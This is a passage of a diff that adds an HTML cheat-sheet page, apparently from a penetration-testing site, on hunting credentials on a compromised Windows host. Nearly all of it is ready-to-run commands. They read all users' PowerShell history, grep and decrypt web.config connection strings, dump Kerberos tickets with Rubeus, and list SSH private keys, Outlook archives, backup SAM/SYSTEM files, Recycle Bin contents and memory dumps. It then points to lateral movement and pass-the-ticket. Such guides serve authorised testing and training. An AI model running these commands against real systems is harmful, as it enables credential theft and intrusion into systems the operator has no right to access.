-</footer>
-
-</body>
-</html>
+<a class=heading-permalink href=#viii-powershell-history-recap-from-local-enum aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Every command typed in PowerShell with PSReadLine gets logged. Common cred source:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-ChildItem</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\*\</span><span class=n>AppData</span><span class=p>\</span><span class=n>Roaming</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>PowerShell</span><span class=p>\</span><span class=n>PSReadLine</span><span class=p>\</span><span class=n>ConsoleHost_history</span><span class=p>.</span><span class=py>txt</span> <span class=n>-EA</span> <span class=n>SilentlyContinue</span> <span class=p>|</span> <span class=p>%{</span> <span class=nb>Write-Host</span> <span class=nv>$_</span><span class=p>.</span><span class=n>FullName</span><span class=p>;</span> <span class=nb>Get-Content</span> <span class=nv>$_</span><span class=p>.</span><span class=py>FullName</span> <span class=p>}</span>
+</span></span></code></pre></div><h2 id=ix-application-configs-and-webconfig data-heading-permalink=true><span class=heading-content>ix. Application configs and web.config</span>
+<a class=heading-permalink href=#ix-application-configs-and-webconfig aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>ASP.NET applications often have DB connection strings in <code>web.config</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\inetpub\wwwroot\*\web.config <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>findstr /si <span class=s2>&#34;connectionString\|password\|pwd&#34;</span> C:\inetpub\wwwroot\*\web.config <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>Decrypt protected sections of web.config (requires being the app pool identity):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe</span><span class=c1> -pdf &#34;connectionStrings&#34; C:\inetpub\wwwroot\app</span>
+</span></span></code></pre></div><p>App.config for .NET desktop apps:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Program Files*\*.config <span class=mi>2</span><span class=p>&gt;</span>nul <span class=p>|</span> findstr /v Microsoft
+</span></span></code></pre></div><h2 id=x-kerberos-cached-tickets data-heading-permalink=true><span class=heading-content>x. Kerberos cached tickets</span>
+<a class=heading-permalink href=#x-kerberos-cached-tickets aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>If you can read another user&rsquo;s Kerberos cache, you have their TGT. Triton/Rubeus dump:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>klist
+</span></span><span class=line><span class=cl>Rubeus.exe dump
+</span></span><span class=line><span class=cl>Rubeus.exe triage
+</span></span></code></pre></div><p>Save and use elsewhere, see <a href=https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/>AD MOC</a>
+-> Pass-the-Ticket.</p><h2 id=xi-ssh-on-windows data-heading-permalink=true><span class=heading-content>xi. SSH on Windows</span>
+<a class=heading-permalink href=#xi-ssh-on-windows aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>OpenSSH client and server are built-in on modern Windows. SSH keys often present:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /a /s C:\Users\*\.ssh\id_*
+</span></span><span class=line><span class=cl><span class=k>type</span> <span class=nv>%userprofile%</span>\.ssh\known_hosts
+</span></span><span class=line><span class=cl><span class=k>type</span> <span class=nv>%userprofile%</span>\.ssh\config
+</span></span></code></pre></div><h2 id=xii-outlook-pst-and-ost data-heading-permalink=true><span class=heading-content>xii. Outlook PST and OST</span>
+<a class=heading-permalink href=#xii-outlook-pst-and-ost aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>User&rsquo;s email archive, often contains password reset emails, internal docs with creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b <span class=s2>&#34;</span><span class=nv>%localappdata%</span><span class=s2>\Microsoft\Outlook\*.pst&#34;</span> <span class=s2>&#34;</span><span class=nv>%localappdata%</span><span class=s2>\Microsoft\Outlook\*.ost&#34;</span> <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>Read offline with <code>libpff</code>, <code>readpst</code>, or open in Outlook on attacker.</p><h2 id=xiii-backup-files-everywhere data-heading-permalink=true><span class=heading-content>xiii. Backup files everywhere</span>
+<a class=heading-permalink href=#xiii-backup-files-everywhere aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Backup files are the goldmine, admins always forget them:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\*.bak C:\*.backup C:\*.old C:\*.orig <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>where /r C:\ *.bak *.old *.config.bak <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>Pay attention to <code>C:\Windows\repair\</code> (SAM/SYSTEM legacy backups) and <code>C:\Users\*\Documents\</code>.</p><h2 id=xiv-recycle-bin data-heading-permalink=true><span class=heading-content>xiv. Recycle Bin</span>
+<a class=heading-permalink href=#xiv-recycle-bin aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Other users&rsquo; deleted files, often readable:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /a /s C:\$Recycle.Bin <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>The filenames are mangled but readable per-SID subdirectories tell you who deleted them.</p><h2 id=xv-memory-dumps-and-crash-dumps data-heading-permalink=true><span class=heading-content>xv. Memory dumps and crash dumps</span>
+<a class=heading-permalink href=#xv-memory-dumps-and-crash-dumps aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Service crashes can dump LSASS-like content:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s C:\Windows\Minidump\
+</span></span><span class=line><span class=cl><span class=k>dir</span> C:\Windows\MEMORY.DMP
+</span></span></code></pre></div><p>Read with WinDbg or <code>strings</code> for cred fragments.</p><h2 id=xvi-after-cred-where-to-use-it data-heading-permalink=true><span class=heading-content>xvi. After cred, where to use it</span>
+<a class=heading-permalink href=#xvi-after-cred-where-to-use-it aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Local user privesc -> <code>runas</code> or RDP</li><li>Lateral to another host -> <a href=https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/>Lateral Movement</a></li><li>AD domain -> <a href=https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/>AD MOC</a></li><li>Cloud creds -> <a href=https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/>Cloud MOC</a></li></ul></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>PrivEsc - DLL & Unquoted Paths</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/windows/w07-uac-bypass/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>UAC Bypass</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
